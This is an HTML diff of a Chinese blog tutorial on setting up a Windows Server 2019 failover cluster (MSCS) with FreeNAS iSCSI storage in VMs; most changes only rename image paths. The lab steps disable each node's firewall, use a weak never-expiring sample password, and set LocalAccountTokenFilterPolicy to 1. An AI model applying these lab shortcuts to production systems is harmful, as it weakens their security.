-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163849667.png" class="" title="image-20241119163849667">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119164004968.png" class="" title="image-20241119164004968">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163825095-1733186553294-29.png" class="" title="image-20241119163825095">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163849667-1733186553294-30.png" class="" title="image-20241119163849667">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119164004968-1733186553294-31.png" class="" title="image-20241119164004968">
 </li>
 </ul>
 </li>
@@ -401,14 +1146,14 @@
 <li><p><strong>创建新用户</strong>：</p>
 <ul>
 <li><p>在左侧的目录树中，右键点击“Users”容器，选择“新建”&gt;“用户”。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001700522.png" class="" title="image-20241120001700522">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001700522-1733186553294-32.png" class="" title="image-20241120001700522">
 </li>
 <li><p>在“新建对象 - 用户”窗口中，输入用户的“姓名”、“用户登录名”（如：<code>moyu</code>），点击“下一步”。 </p>
 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001856348.png" class="" title="image-20241120001856348">
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001856348-1733186553294-34.png" class="" title="image-20241120001856348">
 </li>
 <li><p>设置用户密码（如：<code>Aa123456?</code>），取消勾选“用户下次登录时须更改密码”，确保勾选“用户不能更改密码”和“密码永不过期”，然后点击“下一步”。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001952140.png" class="" title="image-20241120001952140">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001952140-1733186553294-33.png" class="" title="image-20241120001952140">
 </li>
 <li><p>确认信息无误后，点击“完成”创建用户。 </p>
 </li>
@@ -419,11 +1164,11 @@
 <li><p><strong>在 Node A （使用管理员身份进行登录，使用普通用户进行登录，会出现权限不够的问题，导致实验无法成功）上安装故障转移群集功能</strong>：</p>
 <ul>
 <li><p>打开“服务器管理器”，选择“添加角色和功能”。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120002243852.png" class="" title="image-20241120002243852">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120002243852-1733186553294-35.png" class="" title="image-20241120002243852">
 </li>
 <li><p>在“功能”页面，勾选“故障转移群集”，点击“下一步”，然后点击“安装”。 </p>
 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120002822278.png" class="" title="image-20241120002822278">
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120002822278-1733186553294-36.png" class="" title="image-20241120002822278">
 </li>
 <li><p>安装完成后，系统可能提示需要重启，按照提示重启服务器。 </p>
 </li>
@@ -444,7 +1189,7 @@
 <li><p>右键点击右侧空白处，选择“新建”&gt;“DWORD（32 位）值”，命名为 <code>LocalAccountTokenFilterPolicy</code>。 </p>
 </li>
 <li><p>双击新建的键值，将数值数据设置为 <code>1</code>，然后点击“确定”。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120003521751.png" class="" title="image-20241120003521751">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120003521751-1733186553294-37.png" class="" title="image-20241120003521751">
 </li>
 </ul>
 </li>
@@ -453,31 +1198,31 @@
 <li><p>在 Node A 上，打开“故障转移群集管理器”。 </p>
 </li>
 <li><p>在右侧的“管理”下，选择“创建群集”。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120003741756.png" class="" title="image-20241120003741756">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120003741756-1733186553294-38.png" class="" title="image-20241120003741756">
 </li>
 <li><p>在“开始之前”页面，点击“下一步”。 </p>
 </li>
 <li><p>在“选择服务器”页面，输入 <code>Node A</code> 和 <code>Node B</code> 的名称，点击“添加”，然后点击“下一步”。 </p>
 </li>
-<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120095053789.png" class="" title="image-20241120095053789">
+<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120095053789-1733186553294-39.png" class="" title="image-20241120095053789">
 </li>
-<li><p>在“验证访问点”页面，输入群集名称（如：<code>moyu</code>），并指定群集 IP 地址，然后点击“下一步”。</p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105702906.png" class="" title="image-20241120105702906"> 
+<li><p>在“验证访问点”页面，输入群集名称（如：<code>moyuan</code>），并指定群集 IP 地址，然后点击“下一步”。</p>
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105702906-1733186553294-40.png" class="" title="image-20241120105702906"> 
 </li>
 <li><p>在“确认”页面，检查配置无误后，点击“下一步”开始创建群集。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105742243.png" class="" title="image-20241120105742243">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105742243-1733186553294-41.png" class="" title="image-20241120105742243">
 </li>
 <li><p>创建完成后，点击“完成”。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105840347.png" class="" title="image-20241120105840347">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105840347-1733186553295-42.png" class="" title="image-20241120105840347">
 </li>
 </ul>
 </li>
 <li><p><strong>验证群集状态</strong>：</p>
 <ul>
 <li><p>在“故障转移群集管理器”中，查看群集节点的状态，确保 <code>Node A</code> 和 <code>Node B</code> 都处于“联机”状态。 </p>
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105914516.png" class="" title="image-20241120105914516">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105935617.png" class="" title="image-20241120105935617">
-<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120110007789.png" class="" title="image-20241120110007789">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105914516-1733186553295-43.png" class="" title="image-20241120105914516">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120105935617-1733186553295-45.png" class="" title="image-20241120105935617">
+<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120110007789-1733186553295-44.png" class="" title="image-20241120110007789">
 </li>
 <li><p>在“存储”下，查看共享磁盘的状态，确保其已被群集识别并处于“联机”状态。 至此，实验成功完成。</p>
 </li>
@@ -568,9 +1313,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-11-21 14:31:34 / 修改时间：14:32:53" itemprop="dateCreated datePublished" datetime="2024-11-21T14:31:34+08:00">2024-11-21</time>
+      <time title="创建时间：2024-11-21 14:31:34" itemprop="dateCreated datePublished" datetime="2024-11-21T14:31:34+08:00">2024-11-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-12-03 08:46:06" itemprop="dateModified" datetime="2024-12-03T08:46:06+08:00">2024-12-03</time>
     </span>
 
   
@@ -597,10 +1348,10 @@
 <li><p>下载 Windows Server 2019 的镜像文件。</p>
 </li>
 <li><p>安装并配置一台主机 (Master) 后，克隆两个相同的虚拟机节点。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112084901967.png" class="" title="image-20241112084901967">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112084901967-1733186736398-1.png" class="" title="image-20241112084901967">
 </li>
 <li><p>克隆方式为选择“克隆全部内容”。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112085502663.png" class="" title="image-20241112085502663">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112085502663-1733186736398-2.png" class="" title="image-20241112085502663">
 </li>
 </ul>
 </li>
@@ -611,7 +1362,7 @@
 <li><p>适配器 1：设为“仅主机模式”。</p>
 </li>
 <li><p>适配器 2：设为“NAT”模式。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112085924208.png" class="" title="image-20241112085924208">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112085924208-1733186736398-4.png" class="" title="image-20241112085924208">
 </li>
 </ul>
 </li>
@@ -624,16 +1375,16 @@
 <li><p>同时启动 NodeA 和 NodeB。</p>
 </li>
 <li><p>进入 NodeA 的控制面板，调整账户名称为“nodeA”，NodeB 做相应设置。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112090616213.png" class="" title="image-20241112090616213">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112090741343.png" class="" title="image-20241112090741343">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112090616213-1733186736398-3.png" class="" title="image-20241112090616213">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112090741343-1733186736398-5.png" class="" title="image-20241112090741343">
 </li>
 </ul>
 </li>
 <li><p><strong>防火墙关闭</strong>：</p>
 <ul>
 <li><p>在每个节点上关闭防火墙。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091309461.png" class="" title="image-20241112091309461">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091533092.png" class="" title="image-20241112091533092">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091309461-1733186736398-6.png" class="" title="image-20241112091309461">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091533092-1733186736398-7.png" class="" title="image-20241112091533092">
 </li>
 </ul>
 </li>
@@ -644,24 +1395,26 @@
 <li><strong>内网网卡</strong>设置为“Private”。</li>
 <li><strong>外网网卡</strong>设置为“Public”（最好用已连接网络的设置为public)。</li>
 </ul>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091657493.png" class="" title="image-20241112091657493">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092240766.png" class="" title="image-20241112092240766">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112091657493-1733186736399-8.png" class="" title="image-20241112091657493">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092240766-1733186736399-9.png" class="" title="image-20241112092240766">
 </li>
 <li><p>配置心跳网卡和公网网卡的 IP 地址和子网掩码</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092516561.png" class="" title="image-20241112092516561">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092758227.png" class="" title="image-20241112092758227">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092817918.png" class="" title="image-20241112092817918">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092902919-1731374944717-1.png" class="" title="image-20241112092902919">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092953871.png" class="" title="image-20241112092953871">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092516561-1733186736399-10.png" class="" title="image-20241112092516561">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092758227-1733186736399-11.png" class="" title="image-20241112092758227">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092817918-1733186736399-12.png" class="" title="image-20241112092817918">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092902919-1731374944717-1-1733186736399-13.png" class="" title="image-20241112092902919">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112092953871-1733186736399-14.png" class="" title="image-20241112092953871">
 <p>右键公网网卡“public”，配置ip地址及子网掩码，首选DNS指向master节点。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241119163120022.png" class="" title="image-20241119163120022">
-<p>同理配置nodeB节点</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241119162925188.png" class="" title="image-20241119162925188">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094115496.png" class="" title="image-20241112094115496">
+<p>首先查看自动分配的IP</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128035442121.png" class="" title="image-20241128035442121">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128035547570.png" class="" title="image-20241128035547570">
+<p>同理配置另一节点</p>
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128040201315.png" class="" title="image-20241128040201315">
 </li>
 <li><p>在 NodeB 上通过 <code>ping</code> 指令测试与 NodeA 的连通性，以确保节点互通。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094348888.png" class="" title="image-20241112094348888">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112100124326.png" class="" title="image-20241112100124326">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241128040631177.png" class="" title="image-20241128040631177">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112100124326-1733186736399-15.png" class="" title="image-20241112100124326">
 </li>
 </ul>
 </li>
@@ -670,20 +1423,20 @@
 <li><p><strong>iSCSI 配置</strong>：</p>
 <ul>
 <li><p>在 NodeA 上启动 Windows Server 2019 自带的 iSCSI 发起程序。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094515268.png" class="" title="image-20241112094515268">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094515268-1733186736399-16.png" class="" title="image-20241112094515268">
 </li>
 <li><p>输入 FreeNAS 的 IP 地址，进行快速连接。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094554062.png" class="" title="image-20241112094554062">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094554062-1733186736399-17.png" class="" title="image-20241112094554062">
 </li>
 </ul>
 </li>
 <li><p><strong>磁盘管理</strong>：</p>
 <ul>
 <li><p>进入计算机管理中的磁盘管理，将 iSCSI 磁盘设为联机状态。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094723629.png" class="" title="image-20241112094723629">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112094723629-1733186736399-18.png" class="" title="image-20241112094723629">
 </li>
 <li><p>在“此电脑”中查看共享磁盘是否可见。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095154638.png" class="" title="image-20241112095154638">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095154638-1733186736399-19.png" class="" title="image-20241112095154638">
 </li>
 </ul>
 </li>
@@ -692,8 +1445,8 @@
 <li><p>在 NodeB 上重复 NodeA 的磁盘联机步骤，无需关闭 NodeA。</p>
 </li>
 <li><p>至此，共享磁盘环境配置完成。</p>
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095452487.png" class="" title="image-20241112095452487">
-<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095554706.png" class="" title="image-20241112095554706">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095452487-1733186736399-20.png" class="" title="image-20241112095452487">
+<img src="/2024/11/21/%E7%BE%A4%E9%9B%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C/image-20241112095554706-1733186736399-21.png" class="" title="image-20241112095554706">
 </li>
 </ul>
 </li>
